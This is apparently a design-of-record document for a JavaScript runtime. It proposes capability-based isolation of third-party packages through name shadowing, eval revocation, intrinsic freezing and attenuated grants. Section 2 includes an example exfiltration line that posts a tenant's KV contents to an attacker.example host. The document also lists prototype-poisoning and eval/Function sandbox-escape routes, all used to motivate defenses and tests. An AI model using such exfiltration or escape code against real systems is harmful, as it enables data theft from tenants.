# Package isolation — capabilities instead of ambient authority

> **Design of record — NOT built.** This supersedes the "static capability
> gate (P2)" line item in [`package-resolution.md`](package-resolution.md)
> §0, which named the goal but not a mechanism. Nothing here changes the
> per-tenant outbound admission built at the frozen fetch primitive
> (`src/plan/root.zig` `outbound_enabled` → `src/js/bindings/http.zig`
> `outboundRateOk`); that is the tenant-level layer and it is correct where
> it is. This doc is the **library-level** layer, which does not exist.
>
> Delivery is **tracker #751** (leaves enumerated there). Durable residue
> graduates back into this file before the tracker closes.

## 0. Scope

| In | Out |
|---|---|
| Denying package code ambient reach to effects | Per-tenant plan admission (built — `outboundRateOk`) |
| Granting effects to a package by passing them | Metering / rate shaping (built — the `.outbound` limiter action) |
| Freezing shared intrinsics against poisoning | The handler's own authority (the customer's code IS the trust root) |
| Making the grant visible per deployment | A registry review process (people, not mechanism) |

The unit of isolation is a **package** (`/pkg/<pkg_hash>/…`), not a module,
and not "the entry module versus the rest". Three trust domains:

| Domain | Modules | Authority |
|---|---|---|
| Platform | baked `__system/*` | privileged `__rove.*`, `is_system_module`-gated |
| Customer | `index.mjs`, `_triggers/*`, `_middlewares/*`, own relative imports | ambient effects — this is the trust root |
| Third-party | `/pkg/<pkg_hash>/…` | nothing ambient; only what is passed in |

The customer's own helper modules keep ambient authority deliberately.
They are the same trust domain as the entry module — denying
`./lib/util.mjs` an effect only makes the author inline it into
`index.mjs` for the identical result. There is also no single entry
module to privilege: `_triggers/` holds trigger modules of its own
(`src/reserved/root.zig`, the platform-prefix catalog) and
`Dispatcher.runOutcome` re-enters for six activation kinds.

**Known limit.** This tracks provenance *as the deployment declares it*,
not trustworthiness. Third-party code a customer copies into `./lib/`
rather than importing as a package keeps ambient authority. That is the
vendoring tradeoff, chosen by the author, and it is a real gap in the
"no unaudited code holds authority" claim — state it rather than let the
boundary imply more than it delivers.

## 1. Threat model

The attacker publishes, or compromises, a package a tenant depends on —
directly, or as an encapsulated dependency of a package they depend on
(`package-resolution.md`, the per-importer resolution model, keeps that
edge pinned by `pkg_hash`, so it cannot *drift* in; it can still be
malicious from the start, or be a compromised release the tenant then
pins).

The attacker's code runs inside the tenant's activation with whatever the
runtime makes reachable. What they want:

1. **Exfiltration** — read tenant KV / request headers / secrets, send
   them somewhere.
2. **Amplification** — use the tenant's egress as a spam or
   credential-stuffing relay.
3. **Silent corruption** — return wrong answers from a security-critical
   routine (a JWT verifier that returns `true`, a nonce that repeats).
4. **Deputisation** — make the *handler's own* effects do the attacker's
   work, without the package ever holding authority.

This design addresses 1, 2 and 4. It does **not** address 3 — see §6.

## 2. What an attacker gets today

Every effect namespace is installed on the shared realm's global object
before any customer or package module evaluates:

- `src/js/globals.zig:1024` — `for (STATIC_NAMESPACES) |ns| installNamespace(ctx, global, ns)`,
  the table at `:1121` (`kv`, `http`, `crypto`, `events`, `platform`, …).
- The `globals/*.js` public shims eval next, defining the documented
  top-level names ([`builtin-libs.md`](builtin-libs.md), the
  `_system.*` / `globals/` model).
- `_harden.js` then does `delete globalThis._system` (`globals.zig:1098`)
  — deliberately documented there as **hygiene, not a privilege
  boundary**.

All modules in an activation share one realm. Therefore a package with an
empty `imports` list and an empty `capabilities` array can today write:

```js
export function formatDate(d) {
  http.send("https://attacker.example/x", JSON.stringify(await kv.list("")));
  return d.toISOString();
}
```

and nothing in the system objects. The manifest's `capabilities` field
(`src/files/manifest_json.zig:80`) is parsed and stored but never
consulted — and could not be load-bearing as written, because it
describes *declared intent* while authority is *ambient*.

One relevant thing does already exist: `referencesPrivilegedSurface`
(`src/js/deploy_thread.zig:753`) rejects package source that names
`_system` or `__rove`, applied only when `job.pkg_hash.len != 0`
(`:392`) — i.e. **to packages and not to app handlers**. The
deploy-time, package-only static gate is already a real seam with a
real rejection path. This design widens what it rejects.

## 3. The model

Three rules, in the object-capability tradition (and the one Roc reaches
by construction, since its effects arrive from the platform as values):

1. **No ambient authority in package scope.** A package cannot name an
   effect it was not handed.
2. **Grant by passing.** The handler passes a capability object to the
   package it wants to have it. This is a function argument, not a policy
   engine.
3. **Attenuate by wrapping.** What you pass down should be narrower than
   what you hold — `http.to("api.stripe.com")`, not `http`.

Non-inheritance falls out of (1) and (2): a package's own dependency gets
exactly what that package chose to pass it, and nothing by default. Note
carefully what this does *not* claim — capabilities are **transferable**.
A direct dependency may delegate what it holds. The guarantee is *no
ambient authority*, so every grant has a chain of custody visible in
source starting at the handler; it is not *no delegation*.

The customer surface does not change. `http.send(...)` reads identically
whether `http` came from the realm or from a parameter; only its
provenance changes, and only inside packages.

## 4. Mechanism

### 4.1 Deny — module-scope shadowing at compile

Package modules are compiled from source at deploy
(`deploy_thread.zig`, the compile job) under their
`/pkg/<pkg_hash>/…` filename. That is the injection point: prepend a
**capability prologue** to each package module's source before
`compileSourceModule`, shadowing every ambient effect name at module
scope:

```js
const kv = __denied("kv"), http = __denied("http"), crypto = __denied("crypto"),
      events = __denied("events"), platform = __denied("platform"), /* … */;
```

A module-scope `const` shadows the global binding for the whole module,
so the free variable never reaches the realm. `__denied(name)` returns a
Proxy whose every trap throws a typed `CapabilityError` naming the
package and the capability — a package that reaches for authority fails
loudly and attributably rather than silently receiving `undefined`.

Cost: one prologue per package module at deploy, zero at runtime. The
prologue's text is part of the compiled bytecode and therefore part of
`pkg_hash`'s input, so a package cannot be re-linked without it.

The name list is generated from `STATIC_NAMESPACES` plus the shim-defined
top-level names, in one place, so a namespace added later cannot be
forgotten. That generation is the whole point of §4.6.

### 4.2 Deny — realm hardening

Shadowing is a fence, not a wall, while the global object is reachable as
a value or while a package can compile a string into code. Two separate
mechanisms, because they are two separate capabilities.

**Reaching the global object — delete the name.** `_harden.js` already
exists as a realm-wide hardening step baked into the base snapshot at zero
per-request cost; it grows one line:

```js
delete globalThis._system;   // present today
delete globalThis.globalThis;
```

This does **not** break the handler. Removing the *name* does not remove
the global *scope* — a bare `http` in handler code still resolves
lexically. Handlers only lose the ability to obtain the global object as a
first-class value, which no documented API requires. Module code is
strict, so the other classic route (`(function () { return this })()`)
already yields `undefined`.

**Compiling a string — revoke the capability, don't hide the names.**
Deleting `eval` and the four function constructors is a name game, and a
name game is only as good as the enumeration. quickjs makes a better
mechanism available, and explicitly supports it: every path that turns a
string into code — the global `eval`, `new Function(src)`, the async /
generator function constructors, and the public C `JS_Eval` — funnels
through `JS_EvalInternal`, which begins

```c
/* the indirection is needed to make 'eval' optional */
if (unlikely(!ctx->eval_internal))
    return JS_ThrowTypeError(ctx, "eval is not supported");
```

`ctx->eval_internal` is a per-**context** function pointer, and
`JS_AddIntrinsicEval` does nothing else but set it. (The `eval` *global*
comes from `js_global_funcs` via `JS_AddIntrinsicBaseObjects`, so omitting
the eval intrinsic leaves the name bound to a function that throws — which
is the desired end state anyway.)

So the sequence is:

1. `init_fn` installs `JS_AddIntrinsicEval` — required, because
   `evalSnippet` uses the C `JS_Eval` to evaluate every `globals/*.js`
   shim into the base snapshot.
2. After the last snippet — the same moment as the `_system` delete —
   clear the pointer.
3. `Snapshot.create` then calls `JS_FreezeRuntime` (`src/qjs/snap.zig`),
   page-protecting base, so the revocation is frozen with everything else.

Step 2 needs one function in arenajs, which rove already forks:

```c
void JS_RemoveIntrinsicEval(JSContext *ctx) { ctx->eval_internal = NULL; }
```

**The serving context never needs it back.** Runtime modules arrive as
bytecode through `JS_ReadObject`; the loader's source-compile fallback is
reached only when `Ctx.sources` is populated, and the only populators are
the deploy thread (`deploy_thread.zig:510`) and the replay/sim engines
(`src/replay/`) — each of which builds its **own context**
(`deploy_thread.zig:401`) and keeps eval. Intrinsics are per-context, so
compilation and serving are already separated by construction.

This is strictly stronger than deleting names: it revokes the capability
at the single choke point every route shares, so a compile route nobody
enumerated fails identically to one that was.

### 4.3 Freeze the intrinsics — the vector isolation alone does not close

A package needs **no authority at all** to attack via shared intrinsics:

```js
const send = http.send;                     // not reachable after §4.1 — but:
Array.prototype.map = function (f) { /* observe, then defer */ };
```

The package corrupts a prototype; the *handler* later calls its own
`http.send` with data the corrupted method has seen or altered. This is
deputisation (threat 4), it defeats capability denial completely, and it
works against a package with zero granted capabilities.

**The arena already bounds this to one activation.** arenajs shadows base
JSObjects on write: `js_object_for_write` (arenajs `quickjs.c`) lazily
clones any base-resident object into the **request** arena on first
mutation, and `js_object_active` routes subsequent reads to the shadow.
Its design comment names this exact case —
*"Pathological JS code (`globalThis.X = …`, `Array.prototype.foo = …`,
`Object.defineProperty(Object, …)`) can target any base JSObject for
mutation"* — and there is even a dedicated per-request
`std_array_prototype_dirty` flag keeping the fast-path readers correct
when a request has touched `Array.prototype`. The request arena resets
between activations, so a poisoned prototype **does not survive the
request, and never reaches another tenant**. The catastrophic shape of
this attack — persistent realm corruption across every activation on the
thread — is closed by the arena architecture, for free, and this design
must not claim credit for closing it.

What remains is real but bounded: a package's module top-level code runs
at **import**, before the handler body, so within that one activation the
handler does see the poisoned method. That is enough for the redirect
above, and it is what the freeze addresses.

**The effect namespaces need freezing too, and they are not intrinsics.**
`http`, `kv`, `crypto`, `events` are base-resident objects shared by every
module in the activation. A package handed the *raw* `http` can do
`http.send = evil`, and because reads route through the same shadow
(`js_object_active`), the **handler's** own later `http.send(…)` is the
attacker's function — deputisation through the capability namespace rather
than through a prototype. This is the one way handler-ambient authority
could be argued to be load-bearing, and freezing closes it: after the
namespace objects are frozen, that assignment throws instead of
shadowing. Attenuators (`http.to(host)`) must likewise return a **fresh**
object per call, never a mutable view onto the shared one.

Therefore: **freeze the shared intrinsics in the base snapshot** —
`Object`, `Array`, `Function`, `String`, `Number`, `Promise`,
`JSON`, `Map`, `Set`, `TypedArray`, `Error` and their prototypes,
transitively, SES-`lockdown`-style — **plus the effect namespace objects
above**, which are the second, non-intrinsic category. This happens once
at snapshot build, so per-request cost is zero, and it is shared by every
activation.

Compatibility notes that must be tested before this lands: monkey-patching
an intrinsic is a real thing some libraries do, and freezing breaks it
loudly. That is the intended behaviour, but it needs to appear in the
conformance corpus rather than in a customer's logs.

### 4.4 The escape-hatch inventory

The design is only as good as this list being complete. Each entry needs
a negative test that fails if the hatch reopens (see §8).

| Hatch | Closed by |
|---|---|
| bare `http` / `kv` / … free variable | §4.1 module-scope shadow |
| `globalThis.http` | §4.2 name deleted |
| `eval("http")`, `(0,eval)("http")` | §4.2 `eval_internal` revoked |
| `Function("return http")()` | §4.2 — same choke point |
| `(()=>{}).constructor("return http")()` | §4.2 — same choke point |
| async/generator function constructors | §4.2 — same choke point |
| any compile route not enumerated here | §4.2 — same choke point, which is the reason to revoke rather than delete names |
| `this` at module top level | ESM is strict; already `undefined` |
| `import()` of a package not granted | per-importer resolution (`module_execution.zig:447`) — already sound |
| naming `_system` / `__rove` | `referencesPrivilegedSurface` — already built |
| prototype poisoning | §4.3 intrinsic freeze |
| a native binding handing a callback something privileged | audit, §8 |

The last row is the one that cannot be closed by a rule and needs eyes:
every native that invokes a JS callback must be checked for what it passes
into it.

### 4.5 Grant — passing, and attenuation helpers

```js
import { charge } from "@acme/billing";

export default async function handler(request) {
  // handler keeps ambient authority — it is the customer's own code
  return charge(http.to("api.stripe.com"), request.json());
}
```

`http.to(host)` returns a capability object with `http`'s shape and a
narrower reach; the narrowing is enforced in the shared guard layer, not
in JS (§4.6). Ship at least `http.to(host)` for v1; `kv.scoped(prefix)`
is the obvious sibling and should follow, because a package handed raw
`kv` can read every key the tenant owns.

Passing raw `http` remains legal — it has to be, or the model cannot
express "this package genuinely needs open egress." What changes is that
it is now *written down at the call site*, where a reviewer or a lint can
see it.

### 4.6 Where the checks live — all three engines

`rove-guards` is the single authority for handler-facing checks and
`rove-binding` is the single implementation of the JS↔Zig seam, precisely
so the worker, the offline sim/replay driver, and the browser WASM arena
cannot disagree. Capability denial and attenuation are handler-facing
checks and belong there, not in `globals.zig`:

- the **denied-name list** is generated from the binding's namespace
  table, so it cannot drift from what is actually installed;
- **attenuation** (`http.to(host)`'s host check) is a guard — "is this
  allowed", never "what now", per that module's stated boundary.

Anything implemented only in the worker will silently pass in the sim and
diverge in the arena, which the conformance corpus exists to catch — so
add the cases there (`scripts/conformance/`) rather than only in Zig
tests.

## 5. Relationship to the layers that already exist

Authority is the intersection of three narrowings, each enforced where its
own failure mode lives:

```
effective authority = plan entitlement      native, per-call, metered, unbypassable
                    ∩ declared capability   manifest, static, fleet-queryable
                    ∩ passed attenuation    scope, free, per-library
```

- **Plan entitlement** is built and stays exactly where it is.
  `outbound_enabled` is a *refusal* with a distinct error code and no
  `Retry-After`, not an absent object — which is also why a tier without
  egress must not be expressed by withholding the `http` binding: every
  package author would then have to write defensive code for a billing
  state, and a library that works on one tier and `TypeError`s on another
  is a support burden nobody can test for.
- **Declared capability** is the manifest field, which becomes meaningful
  for the first time in Phase 3: an upper bound checkable at deploy and
  answerable fleet-wide ("which tenants ship a package that asks for
  egress") without reading code.
- **Passed attenuation** is this document.

## 6. What this does not prevent

Stated plainly so nobody reads the design as stronger than it is.

- **Wrong answers.** A JWT verifier that returns `true`, or a signing
  routine with a predictable nonce, needs zero capabilities. The
  security-critical first-party libraries (`jwt`, `oauth`, `oidc`,
  `sessions`) are exactly the ones where the damage requires no I/O. No
  capability model addresses this; only review and, where possible,
  keeping such code first-party and out of the package graph.
- **Data the handler chooses to pass.** A package handed the request body
  has the request body.
- **Delegation by a trusted direct dependency** (§3).
- **Resource exhaustion.** Budget and timeout are separate mechanisms.

## 7. Phasing

Each phase ships on its own and is useful without the next.

**Ship every phase at its most restrictive setting.** Each of these
restrictions is *additive to relax* — unfreezing one intrinsic, restoring
`eval`, granting a capability, all take working customer code and give it
more room. Every one of them is *breaking to tighten*, because tightening
takes working customer code and stops it. The asymmetry runs one way, so
the default is maximal and the relaxations are earned by a real report.
That only works if a refusal is legible: see the legibility rule below.

**The two deadlines are different, and neither is "launch" generically.**

| Phase | Real deadline | Why |
|---|---|---|
| 1 | **first customer handler** | it constrains handler code, so it must precede code that could depend on the freedom |
| 2, 3 | **third-party self-serve publish** | until then no attacker-authored package can be pinned |
| 0 | none — ship whenever | pure gain, no surface |

The registry publishes **only `@rewind/*`** and only to an operator
(`is_root`); third-party self-serve and scope ownership are explicitly
post-v1 (`web/registry/index.mjs`, `RESERVED_SCOPE`). So the §1 threat
model is gated at the registry today, not at the runtime — the package a
tenant pins is one rove published. That does **not** make this work
optional; it means Phase 1's deadline is launch and Phase 2/3's deadline
is the day self-serve opens, and confusing the two would either delay
launch or ship self-serve onto an unprepared runtime.

Note the registry already carries a `gates.mjs` pure section performing
publish-time capability extraction that *mirrors the engine's deploy-time
gates* — including its own copy of `findsIdent`. Phase 3's declaration
layer should extend that mirror rather than grow a second one, and the
two copies need the shared-rules treatment (one authority, generated
data) or they will drift.

**The legibility rule.** A maximal restriction is only cheap to relax if
you can see it biting. Every refusal added here must be **typed, named,
and counted** — not a bare engine `TypeError`. `__denied()` (§4.1) already
throws a named `CapabilityError`; the freeze and the eval revocation do
not, and by default surface as `Cannot assign to read only property 'map'`
and `eval is not supported`, which read as platform bugs rather than
policy. Both need to be caught and re-thrown with a message that names the
restriction and points at the relaxation path, and both need a metric, so
the decision to relax comes from fleet data instead of from a support
ticket.

**Phase 0 — effect provenance in the tape.** Record the emitting module on
each effect entry (`src/tape/root.zig:411`, the `Entry` union). Today the
tape records module resolution on the `.module` channel and effects on
their own channels, and never joins them. Independent of everything else,
cheap, and it converts this whole class of attack from invisible to
attributable and fleet-greppable — detection is the lever this platform
has that a language runtime does not.

**Phase 1 — intrinsic freeze + realm harden.** §4.2 and §4.3. Realm-wide,
in the base snapshot, no per-request cost, no surface change. It closes
the within-activation deputisation vector (§4.3) and the compile-a-string
routes (§4.2). Ordered first not because deputisation is the largest
remaining hole — the arena already bounds that one to a single activation
— but because its deadline is the hardest: it restricts **handler** code,
so it has to land before there is customer code that could depend on
mutating an intrinsic or calling `eval`. Freeze the full ES intrinsic set,
not the `Object.prototype`-only subset (§9), on the same asymmetry
argument.

**Phase 2 — package scope denial.** §4.1 plus the widened deploy-time
scan. At this point a package can compute and nothing else. First-party
packages that need effects break here, which is the signal to migrate
them.

**Phase 3 — grant + attenuation + declaration.** §4.5, and the manifest
`capabilities` field becomes an enforced upper bound checked at deploy.

## 8. Test plan

The failure mode to design against is an inert probe: a negative test that
passes both when the fence holds and when the test never reached it.

- **One escape-hatch case per row of §4.4**, as a package that *attempts*
  the escape and must be refused. Each must be shown failing against the
  pre-change build — a hatch test that has never been red proves nothing.
- **Prototype-poisoning case**: package mutates `Array.prototype.map`;
  assert the handler's subsequent behaviour is unchanged.
- **Deploy-rejection cases** in `deploy_thread.zig`'s existing style, next
  to the `referencesPrivilegedSurface` tests.
- **Conformance cases** (`scripts/conformance/`) for anything
  behaviour-visible, so the sim and the WASM arena agree with the worker.
- **A smoke** that publishes a hostile package against a real cluster and
  asserts the refusal reaches the customer as a typed error, not a
  `TypeError` — the seam, not the halves.

## 9. Open questions

1. **Does the handler keep ambient authority, or take a `ctx` parameter?**
   **Recommendation: `ctx`.** Not on security grounds — the handler is the
   trust root either way, an ambient `http` *is* a capability object merely
   named lexically, and the two things that would have made the parameter
   load-bearing do not (a package cannot capture a capability across
   activations, since `snapshot.restoreMode` restores per request and
   module instances are re-evaluated into the restored context; and
   mutation of the shared namespace object is closed by freezing it,
   §4.3).

   The decisive argument is **ecosystem formation**. A registry exists so
   that people extract libraries out of applications. Under
   ambient-for-handler, effect-using app code reaches `http`/`kv` as free
   variables, and §4.1 denies exactly those names inside `/pkg/`. So
   "promote this module to a package" stops being a *move* and becomes a
   *rewrite* of every effect reference — a porting cliff sitting precisely
   where we want the path to be frictionless. Under `ctx`, effects are
   always *received*: promoting a module changes who hands it the object,
   never its body.

   The cliff is created by whichever idiom people actually write in, so
   the benefit only lands if ambient authority is **removed**, not merely
   discouraged — the path of least resistance wins otherwise. That makes
   this the same ratchet as everything else in §7: uniform-and-restrictive
   is cheap now and unaffordable once handlers exist in the ambient idiom,
   because every one of them becomes a migration.

   Cost, honestly: a full surface migration — every handler, doc example,
   conformance case, the first-party packages, and `handler-shape.md`.
   Tractable pre-launch and not after, which is why the window is now.

   **If confirmed**, §0's domain table, §3, §4.5 and §7 need rewriting to
   assume received-not-ambient throughout; this doc still reads
   ambient-for-handler.
2. **Intrinsic freeze compatibility — in-tree cost is zero; the question
   is what customers lose.** Inventory taken: `INTRINSIC_EXTENSIONS`
   (`globals.zig`) is empty, and `Date.now`/`Math.random` determinism is
   native per-context state driven by `JS_SetDateNow`/`JS_SetRandomSeed`,
   not JS property writes — so freezing `Date`/`Math` costs nothing. No
   `globals/*.js` shim mutates an intrinsic (`request.js` defines
   accessors on its own `__rove_request_proto`; `urlsearchparams.js`
   defines `[Symbol.iterator]` on its own class). The apps and registry
   in `web/` mutate none. The single repo-wide prototype write is
   `src/replay/js/textcodec_pure.js` patching
   `TextEncoder`/`TextDecoder.prototype` — which are rove's own globals,
   not ECMAScript intrinsics, in the replay engine's own context. **That
   is the scoping lesson: freeze the ECMAScript intrinsics, not every
   shared object rove installs.**

   The real cost is customer-facing and structural. The base snapshot is
   built once per worker thread and **shared across tenants**, so
   per-tenant polyfills can never live in it. Today a handler can still
   patch an intrinsic per-request (the arena shadows it, §4.3, so it stays
   isolated); after the freeze it cannot. The consequence is that **rove
   takes on the job**: anything handlers legitimately need and quickjs-ng
   lacks must ship as a first-party shim in the snapshot, which is
   cheaper anyway (zero per-request cost, one implementation). The
   follow-up work is to diff quickjs-ng's supported surface against what
   handlers need and close the gap before Phase 1 lands.

   Note also there is no "let the app polyfill first, then freeze" window:
   imported packages evaluate *before* the importing handler's body, so
   any freeze late enough to permit app polyfilling is too late to
   constrain packages.

3. **`new Function` codegen** — template engines and fast-path
   serializers use it, and §4.2's eval revocation removes it. Same
   inventory question, different mechanism; both breaks are loud, which
   is the intent, but they belong in the conformance corpus rather than
   in a customer's logs.
4. **Attenuation vocabulary** — `http.to(host)` and `kv.scoped(prefix)`
   are the obvious two. Is there a third that matters at launch?
5. **Does the WASM arena share the base snapshot's hardening**, or does it
   build its own realm? Determines whether Phase 1 is one change or two.
6. **The arenajs change is a dep bump, not a local patch.**
   `JS_RemoveIntrinsicEval` lands in `anarchodev/arenajs` first and is
   pinned here by hash in the same PR — push-then-pin, no path override.
   It is one function against a fork rove already owns, but it sequences
   the phase.

## 10. Rejected alternatives

- **A separate `JSContext` per package.** True realm isolation, and the
  strongest version of this design. Rejected for launch: module instances
  are not shared across contexts, capability objects must cross the
  boundary, and the per-request arena-reset model
  (`decisions.md`) would need rework. Revisit if §4.4 proves
  incomplete — the phased design above is deliberately compatible with
  swapping the mechanism underneath it.
- **Withholding the `http` binding for tiers without egress.** See §5.
- **A manifest-only capability gate** (the original P2 line). Rejected:
  it checks a declaration while authority stays ambient, so it stops an
  honest package and not a hostile one. Retained as the *declaration*
  layer in Phase 3, which is what it is actually good for.
- **Auditing the dependency graph instead** (the vendoring answer).
  Rejected as the primary mechanism because it scales by making a human
  the bottleneck; retained as a complement for the packages in §6 where
  no mechanism helps.
